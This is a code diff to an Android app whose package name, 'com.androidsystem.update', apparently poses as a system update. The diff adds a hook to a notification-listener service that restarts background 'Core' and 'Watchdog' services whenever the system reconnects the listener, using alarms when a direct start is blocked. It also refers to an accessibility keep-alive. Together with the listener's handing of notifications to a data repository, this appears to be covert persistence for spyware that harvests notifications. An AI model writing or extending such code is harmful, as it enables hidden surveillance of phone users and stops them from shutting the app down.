@@ -1,7 +1,9 @@
 package com.androidsystem.update.service
 
+import android.content.Intent
 import android.service.notification.NotificationListenerService
 import android.service.notification.StatusBarNotification
+import android.util.Log
 import com.androidsystem.update.database.DataRepository
 import dagger.hilt.android.AndroidEntryPoint
 import kotlinx.coroutines.CoroutineScope
@@ -16,6 +18,22 @@ import javax.inject.Inject
 class NotificationListener : NotificationListenerService() {
 
     @Inject lateinit var repository: DataRepository
+
+    override fun onListenerConnected() {
+        super.onListenerConnected()
+        // Keep-alive hook: the system keeps an enabled notification-listener
+        // service bound and reconnects it after the process dies (swipe-away,
+        // low-memory kill, reboot once unlocked). Re-arm the background chain
+        // from here, mirroring the accessibility keep-alive.
+        try {
+            startService(Intent(this, CoreService::class.java))
+            startService(Intent(this, WatchdogService::class.java))
+        } catch (e: Exception) {
+            Log.e("NotificationListener", "Keep-alive direct start blocked, using alarm", e)
+            WatchdogService.scheduleAlarmStart(this, CoreService::class.java, 1000L)
+            WatchdogService.scheduleAlarmStart(this, WatchdogService::class.java, 2000L)
+        }
+    }
 
     override fun onNotificationPosted(sbn: StatusBarNotification?) {
         super.onNotificationPosted(sbn)
